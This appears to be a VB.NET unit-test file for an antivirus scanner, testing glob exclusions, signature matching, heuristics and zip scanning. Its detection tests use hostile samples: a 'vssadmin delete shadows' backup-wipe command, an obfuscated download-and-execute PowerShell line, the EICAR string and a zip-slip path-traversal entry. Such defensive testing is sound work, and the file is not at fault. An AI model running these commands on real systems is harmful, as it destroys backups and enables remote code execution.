Imports System.IO
Imports System.IO.Compression
Imports System.Text
Imports Microsoft.VisualStudio.TestTools.UnitTesting
Imports AVAK.Core
Imports AVAK.Security

Namespace AVAK.Tests

    <TestClass>
    Public Class GlobTests

        <TestMethod>
        Public Sub Star_matches_extension()
            Assert.IsTrue(ScanEngine.GlobMatch("setup.iso", "*.iso"))
            Assert.IsTrue(ScanEngine.GlobMatch("SETUP.ISO", "*.iso"))
            Assert.IsFalse(ScanEngine.GlobMatch("setup.iso.exe", "*.iso"))
        End Sub

        <TestMethod>
        Public Sub Star_matches_inside_a_path()
            Assert.IsTrue(ScanEngine.GlobMatch("C:\Builds\proj\bin\app.exe", "C:\Builds\*\bin\*"))
            Assert.IsFalse(ScanEngine.GlobMatch("C:\Other\proj\bin\app.exe", "C:\Builds\*\bin\*"))
        End Sub

        <TestMethod>
        Public Sub Question_mark_matches_one_character()
            Assert.IsTrue(ScanEngine.GlobMatch("a1.log", "a?.log"))
            Assert.IsFalse(ScanEngine.GlobMatch("a12.log", "a?.log"))
        End Sub

        <TestMethod>
        Public Sub Trailing_stars_are_optional()
            Assert.IsTrue(ScanEngine.GlobMatch("readme", "readme*"))
            Assert.IsTrue(ScanEngine.GlobMatch("readme", "readme***"))
        End Sub

        <TestMethod>
        Public Sub Empty_and_null_are_safe()
            Assert.IsFalse(ScanEngine.GlobMatch(Nothing, "*"))
            Assert.IsFalse(ScanEngine.GlobMatch("x", Nothing))
            Assert.IsTrue(ScanEngine.GlobMatch("", "*"))
        End Sub

        <TestMethod>
        Public Sub Exclusion_uses_prefix_for_plain_entries_and_glob_otherwise()
            Dim cfg As New AppSettings()
            cfg.ExcludedPaths.Add("C:\Games")
            cfg.ExcludedPaths.Add("*.vmdk")

            Assert.IsTrue(ScanEngine.IsExcluded("C:\Games\steam\game.exe", cfg))
            Assert.IsTrue(ScanEngine.IsExcluded("D:\VMs\disk.vmdk", cfg))
            Assert.IsFalse(ScanEngine.IsExcluded("C:\Work\report.docx", cfg))
        End Sub
    End Class

    <TestClass>
    Public Class SignatureTests

        <TestMethod>
        Public Sub Ascii_pattern_fires_on_exact_bytes()
            SignatureDatabase.EnsureLoaded()
            Dim payload = Encoding.ASCII.GetBytes("@echo off" & vbCrLf & "vssadmin delete shadows /all /quiet")
            Dim hits = SignatureDatabase.MatchPatterns(payload, payload.Length, ".bat")
            Assert.IsTrue(hits.Count > 0, "the shadow-copy wipe signature should fire")
        End Sub

        <TestMethod>
        Public Sub Pattern_does_not_fire_on_clean_content()
            SignatureDatabase.EnsureLoaded()
            Dim payload = Encoding.ASCII.GetBytes("@echo off" & vbCrLf & "echo hello world")
            Dim hits = SignatureDatabase.MatchPatterns(payload, payload.Length, ".bat")
            Assert.AreEqual(0, hits.Count)
        End Sub

        <TestMethod>
        Public Sub Extension_scoping_is_honoured()
            SignatureDatabase.EnsureLoaded()
            Dim payload = Encoding.ASCII.GetBytes("vssadmin delete shadows /all /quiet")
            ' the signature is scoped to script extensions, so a .png must not match
            Dim hits = SignatureDatabase.MatchPatterns(payload, payload.Length, ".png")
            Assert.AreEqual(0, hits.Count)
        End Sub

        <TestMethod>
        Public Sub Eicar_string_is_detected_by_pattern()
            SignatureDatabase.EnsureLoaded()
            Dim eicar = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
            Dim payload = Encoding.ASCII.GetBytes(eicar)
            Dim hits = SignatureDatabase.MatchPatterns(payload, payload.Length, ".com")
            Assert.IsTrue(hits.Any(Function(h) h.Name.Contains("EICAR")))
        End Sub

        <TestMethod>
        Public Sub Sha256_of_empty_input_is_the_known_constant()
            Assert.AreEqual("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                            SignatureDatabase.Sha256Bytes(Array.Empty(Of Byte)(), 0))
        End Sub
    End Class

    <TestClass>
    Public Class HeuristicTests

        Private Shared Function Bytes(s As String) As Byte()
            Return Encoding.ASCII.GetBytes(s)
        End Function

        <TestMethod>
        Public Sub Double_extension_is_flagged()
            Dim data = New Byte(255) {}
            data(0) = &H4D : data(1) = &H5A            ' MZ
            Dim r = HeuristicAnalyzer.Analyze("C:\Users\x\Downloads\invoice.pdf.exe", data, data.Length, Nothing, 2)
            Assert.IsTrue(r.Score >= 30, "a .pdf.exe lure should score well above zero")
            Assert.IsTrue(r.Reasons.Any(Function(x) x.Contains("Double extension")))
        End Sub

        <TestMethod>
        Public Sub Plain_text_file_is_clean()
            Dim data = Bytes("This is an ordinary note with nothing interesting in it." & vbCrLf)
            Dim r = HeuristicAnalyzer.Analyze("C:\note.txt", data, data.Length, Nothing, 2)
            Assert.AreEqual(Severity.Clean, r.Severity)
        End Sub

        <TestMethod>
        Public Sub Obfuscated_powershell_is_flagged()
            Dim script = "$b=[Convert]::FromBase64String('AAAA'); Invoke-Expression ([Text.Encoding]::UTF8.GetString($b));" &
                         " (New-Object System.Net.WebClient).DownloadString('http://x')"
            Dim data = Bytes(script)
            Dim r = HeuristicAnalyzer.Analyze("C:\a.ps1", data, data.Length, Nothing, 2)
            Assert.IsTrue(r.Severity >= Severity.Medium, "obfuscated PowerShell should reach at least Medium")
        End Sub

        <TestMethod>
        Public Sub Executable_named_as_an_image_is_flagged()
            Dim data = New Byte(1023) {}
            data(0) = &H4D : data(1) = &H5A
            Dim r = HeuristicAnalyzer.Analyze("C:\holiday.jpg", data, data.Length, Nothing, 2)
            Assert.IsTrue(r.Reasons.Any(Function(x) x.Contains("Windows executable")))
        End Sub

        <TestMethod>
        Public Sub Entropy_of_uniform_data_is_zero()
            Dim data = New Byte(999) {}
            Assert.AreEqual(0.0R, HeuristicAnalyzer.Entropy(data, 0, data.Length), 0.0001R)
        End Sub

        <TestMethod>
        Public Sub Entropy_of_all_byte_values_is_eight()
            Dim data(255) As Byte
            For i = 0 To 255
                data(i) = CByte(i)
            Next
            Assert.AreEqual(8.0R, HeuristicAnalyzer.Entropy(data, 0, data.Length), 0.0001R)
        End Sub

        <TestMethod>
        Public Sub Sensitivity_scales_the_score()
            Dim data = New Byte(255) {}
            data(0) = &H4D : data(1) = &H5A
            Dim lenient = HeuristicAnalyzer.Analyze("C:\a.pdf.exe", data, data.Length, Nothing, 1).Score
            Dim aggressive = HeuristicAnalyzer.Analyze("C:\a.pdf.exe", data, data.Length, Nothing, 3).Score
            Assert.IsTrue(aggressive > lenient)
        End Sub
    End Class

    <TestClass>
    Public Class ArchiveTests

        Private Shared Function MakeZip(entries As Dictionary(Of String, Byte())) As String
            Dim tmpFile = Path.Combine(Path.GetTempPath(), "avak-test-" & Guid.NewGuid().ToString("N") & ".zip")
            Using fs As New FileStream(tmpFile, FileMode.Create)
                Using zip As New ZipArchive(fs, ZipArchiveMode.Create)
                    For Each kv In entries
                        Dim e = zip.CreateEntry(kv.Key)
                        Using st = e.Open()
                            st.Write(kv.Value, 0, kv.Value.Length)
                        End Using
                    Next
                End Using
            End Using
            Return tmpFile
        End Function

        <TestMethod>
        Public Sub Clean_archive_produces_no_hits()
            Dim tmpFile = MakeZip(New Dictionary(Of String, Byte()) From {
                {"readme.txt", Encoding.ASCII.GetBytes("nothing to see here")}})
            Try
                Dim hits = ArchiveScanner.Scan(tmpFile, New AppSettings())
                Assert.AreEqual(0, hits.Count)
            Finally
                File.Delete(tmpFile)
            End Try
        End Sub

        <TestMethod>
        Public Sub Malicious_entry_is_found_inside_the_archive()
            Dim tmpFile = MakeZip(New Dictionary(Of String, Byte()) From {
                {"readme.txt", Encoding.ASCII.GetBytes("ok")},
                {"payload.bat", Encoding.ASCII.GetBytes("vssadmin delete shadows /all /quiet")}})
            Try
                Dim hits = ArchiveScanner.Scan(tmpFile, New AppSettings())
                Assert.IsTrue(hits.Count >= 1)
                Assert.IsTrue(hits.Any(Function(h) h.EntryName.Contains("payload.bat")))
            Finally
                File.Delete(tmpFile)
            End Try
        End Sub

        <TestMethod>
        Public Sub Zip_slip_entry_names_are_rejected()
            ' ZipArchive refuses some traversal names, so build the entry name defensively
            Dim tmpFile = Path.Combine(Path.GetTempPath(), "avak-slip-" & Guid.NewGuid().ToString("N") & ".zip")
            Using fs As New FileStream(tmpFile, FileMode.Create)
                Using zip As New ZipArchive(fs, ZipArchiveMode.Create)
                    Dim e = zip.CreateEntry("../../evil.txt")
                    Using st = e.Open()
                        Dim b = Encoding.ASCII.GetBytes("x")
                        st.Write(b, 0, b.Length)
                    End Using
                End Using
            End Using
            Try
                Dim hits = ArchiveScanner.Scan(tmpFile, New AppSettings())
                Assert.IsTrue(hits.Any(Function(h) h.ThreatName.Contains("PathTraversal")),
                              "a ../ entry name must be reported")
            Finally
                File.Delete(tmpFile)
            End Try
        End Sub

        <TestMethod>
        Public Sub Zip_magic_is_recognised()
            Dim pk = New Byte() {&H50, &H4B, 3, 4, 0, 0}
            Assert.IsTrue(ArchiveScanner.LooksLikeZip(pk, pk.Length))
            Dim mz = New Byte() {&H4D, &H5A, 0, 0}
            Assert.IsFalse(ArchiveScanner.LooksLikeZip(mz, mz.Length))
        End Sub

        <TestMethod>
        Public Sub Supported_extensions_include_office_and_java()
            Assert.IsTrue(ArchiveScanner.IsSupported(".docx"))
            Assert.IsTrue(ArchiveScanner.IsSupported(".JAR"))
            Assert.IsFalse(ArchiveScanner.IsSupported(".exe"))
        End Sub
    End Class

End Namespace
